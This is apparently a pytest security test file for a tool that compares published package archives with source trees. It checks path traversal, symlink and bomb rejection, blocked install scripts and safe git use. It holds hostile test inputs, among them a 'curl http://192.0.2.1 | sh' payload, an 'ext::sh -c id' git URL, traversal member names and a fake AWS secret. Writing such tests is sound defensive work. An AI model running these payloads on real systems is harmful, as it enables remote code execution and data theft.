"""The tool processes hostile input and must not become the attack vector (PRD SEC-1 .. SEC-4)."""

from __future__ import annotations

import io
import json
import os
import tarfile

import pytest

from whotouchedmytarball import archive, sources
from whotouchedmytarball.analyzer import AnalyzeOptions, analyze_local
from whotouchedmytarball.archive import UnsafeArchiveError, UnsupportedArchiveError, extract
from whotouchedmytarball.compare import list_files

from .conftest import INDEX_JS, make_tgz, make_zip, npm_manifest, write_tree

OPTS = AnalyzeOptions(ai=None)


def tar_with(path, members):
    """members: list of (TarInfo kwargs, data or None)."""
    with tarfile.open(path, "w:gz") as tar:
        for kw, data in members:
            info = tarfile.TarInfo(kw.pop("name"))
            for k, v in kw.items():
                setattr(info, k, v)
            if data is not None:
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
            else:
                tar.addfile(info)
    return path


# --- SEC-1 safe extraction -----------------------------------------------------------------------

@pytest.mark.parametrize("name", ["..\\..\\escape.js", "package/../../escape.js", "C:/Windows/escape.js",
                                  "/abs/escape.js", "package/./../../escape.js"])
def test_hostile_member_names_are_rejected(tmp_path, name):
    evil = tar_with(tmp_path / "evil.tgz", [({"name": name}, b"x")])
    with pytest.raises(UnsafeArchiveError):
        extract(evil, tmp_path / "out" / "deep")
    assert not list(tmp_path.rglob("escape.js"))


@pytest.mark.parametrize("kind", [tarfile.LNKTYPE, tarfile.SYMTYPE, tarfile.CHRTYPE, tarfile.FIFOTYPE])
def test_links_and_device_files_are_never_created(tmp_path, kind):
    evil = tar_with(tmp_path / "evil.tgz", [
        ({"name": "package/index.js"}, b"x"),
        ({"name": "package/special", "type": kind, "linkname": "/etc/passwd"}, None),
    ])
    result = extract(evil, tmp_path / "out")
    assert not os.path.lexists(result.root / "special")
    assert any("special" in s for s in result.skipped)


def test_symlink_inside_zip_is_not_created(tmp_path):
    import zipfile
    path = tmp_path / "evil.whl"
    with zipfile.ZipFile(path, "w") as zf:
        info = zipfile.ZipInfo("demo/link")
        info.external_attr = (0o120777 << 16)
        zf.writestr(info, "/etc/passwd")
        zf.writestr("demo/__init__.py", "")
    result = extract(path, tmp_path / "out")
    assert not os.path.lexists(result.root / "demo" / "link")


def test_too_many_files_is_refused(tmp_path, monkeypatch):
    monkeypatch.setattr(archive, "MAX_FILES", 3)
    bomb = make_tgz(tmp_path / "bomb.tgz", {f"f{i}.js": "x" for i in range(10)})
    with pytest.raises(UnsafeArchiveError):
        extract(bomb, tmp_path / "out")


def test_decompression_bomb_is_refused(tmp_path, monkeypatch):
    monkeypatch.setattr(archive, "MAX_TOTAL_BYTES", 1024)
    bomb = make_zip(tmp_path / "bomb.zip", {"a.bin": b"\0" * 4096})
    with pytest.raises(UnsafeArchiveError):
        extract(bomb, tmp_path / "out")


def test_file_and_directory_with_the_same_name_is_an_unsafe_archive(tmp_path):
    """A crafted archive must give a clean error, not crash the tool with NotADirectoryError."""
    evil = make_tgz(tmp_path / "evil.tgz", {"lib": "x", "lib/index.js": "y"})
    with pytest.raises(UnsafeArchiveError):
        extract(evil, tmp_path / "out")


def test_case_colliding_names_cannot_hide_a_payload(tmp_path):
    """On macOS/Windows, INDEX.JS would overwrite index.js on disk and the payload would never be scanned."""
    evil = make_tgz(tmp_path / "evil.tgz", {
        "index.js": "require('child_process').exec('curl http://192.0.2.1 | sh');\n",
        "INDEX.JS": INDEX_JS,
    })
    with pytest.raises(UnsafeArchiveError):
        extract(evil, tmp_path / "out")


def test_unsupported_archive_type(tmp_path):
    (tmp_path / "x.rar").write_bytes(b"Rar!")
    with pytest.raises(UnsupportedArchiveError):
        extract(tmp_path / "x.rar", tmp_path / "out")


def test_extracted_files_are_not_executable(tmp_path):
    pkg = tar_with(tmp_path / "x.tgz", [({"name": "package/run.sh", "mode": 0o755}, b"#!/bin/sh\nid\n")])
    result = extract(pkg, tmp_path / "out")
    assert not os.access(result.root / "run.sh", os.X_OK)


# --- SEC-2 nothing from the package is executed --------------------------------------------------

def test_analysis_never_runs_package_code(tmp_path, npm_source):
    marker = tmp_path / "PWNED"
    write = f"open({str(marker)!r}, 'w').write('x')"
    manifest = json.loads(npm_manifest())
    manifest["scripts"].update({"preinstall": f"touch {marker}", "postinstall": f"touch {marker}",
                                "prepare": f"touch {marker}"})
    npm_pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": json.dumps(manifest), "index.js": INDEX_JS + f"require('fs').writeFileSync({str(marker)!r}, 'x');\n",
    })
    analyze_local(npm_pkg, str(npm_source), opts=OPTS)

    src = write_tree(tmp_path / "pysrc", {"src/demo/__init__.py": ""})
    wheel = make_zip(tmp_path / "demo-1.0-py3-none-any.whl", {
        "demo/__init__.py": write + "\n", "evil.pth": f"import os; {write}\n",
        "demo-1.0.data/scripts/setup.py": write + "\n",
    })
    analyze_local(wheel, str(src), opts=OPTS)
    assert not marker.exists()


# --- SEC-3 safe git ------------------------------------------------------------------------------

def test_git_runs_without_hooks_or_prompts(monkeypatch):
    seen = {}

    def fake_run(cmd, **kw):
        seen["cmd"], seen["env"] = cmd, kw["env"]
        class P:
            returncode, stdout, stderr = 0, "", ""
        return P()

    monkeypatch.setattr(sources.subprocess, "run", fake_run)
    sources._git(["status"])
    assert "core.hooksPath=/dev/null" in seen["cmd"]
    assert seen["env"]["GIT_TERMINAL_PROMPT"] == "0" and seen["env"]["GIT_LFS_SKIP_SMUDGE"] == "1"


@pytest.mark.parametrize("url", ["file:///etc", "ext::sh -c id", "/etc/passwd", "https://evil.example/o/r"])
def test_only_known_https_forges_are_accepted_as_repositories(url):
    assert sources.normalize_repo_url(url) is None


# --- SEC-4 no reads outside the compared trees ---------------------------------------------------

def test_source_symlink_to_host_file_is_ignored(tmp_path):
    secret = tmp_path / "host-secret.txt"
    secret.write_text("AWS_SECRET_ACCESS_KEY=hunter2\n")
    repo = write_tree(tmp_path / "repo", {"index.js": "x\n"})
    (repo / "leak.txt").symlink_to(secret)
    (repo / "dir-leak").symlink_to(tmp_path)
    files = list_files(repo)
    assert set(files) == {"index.js"}


def test_source_symlink_inside_repo_is_followed(tmp_path):
    repo = write_tree(tmp_path / "repo", {"shared/fixture.json": "{}\n"})
    (repo / "fixture.json").symlink_to(repo / "shared" / "fixture.json")
    assert {"fixture.json", "shared/fixture.json"} <= set(list_files(repo))
